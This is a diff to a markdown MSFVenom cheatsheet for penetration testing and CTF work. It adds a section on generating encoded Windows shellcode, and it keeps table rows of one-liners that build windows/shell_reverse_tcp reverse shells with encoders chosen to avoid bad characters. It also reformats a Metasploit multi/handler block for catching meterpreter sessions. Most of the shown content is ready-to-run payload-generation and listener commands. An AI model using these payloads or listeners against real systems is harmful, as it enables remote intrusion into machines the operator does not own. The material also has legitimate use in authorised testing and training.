@@ -1,10 +1,16 @@
 # MSFVenom Cheatsheet
+
 Single Page Cheatsheet for common MSF Venom One Liners
 Available in PDF, DOCX and Markdown format!
 *PDF and DOCX versions contain the payload size in bytes and a few more commands.*
 
+## MSFVenom Payloads for CTF
 
-# MSFVenom Cheatsheet
+- Creating a payload with CMD of Powershell (windows):
+    `msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`
+    *BufferRegister=EAX will put the jump at the start of our shell code on '\x00' bit*
+
+## Cheatsheet Table
 
 | MSFVenom Payload Generation One-Liner | Description |
 |-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
@@ -35,21 +41,22 @@ Available in PDF, DOCX and Markdown format!
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |
 
-# Multihandler Listener
+## Multihandler Listener
+
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,
-```
-msf>use exploit/multi/handler
-msf>set payload windows/meterpreter/reverse_tcp
-msf>set lhost <IP>
-msf>set lport <PORT>
-msf> set ExitOnSession false
-msf>exploit -j
-```
-The -j option is to keep all the connected session in the background.
 
+    ```shell
+    msf>use exploit/multi/handler
+    msf>set payload windows/meterpreter/reverse_tcp
+    msf>set lhost <IP>
+    msf>set lport <PORT>
+    msf> set ExitOnSession false
+    msf>exploit -j
+    ```
+_The -j option is to keep all the connected session in the background._
 
-# References
+## References
 
-https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675
-https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
-http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
+<https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675>
+<https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/>
+<http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/>
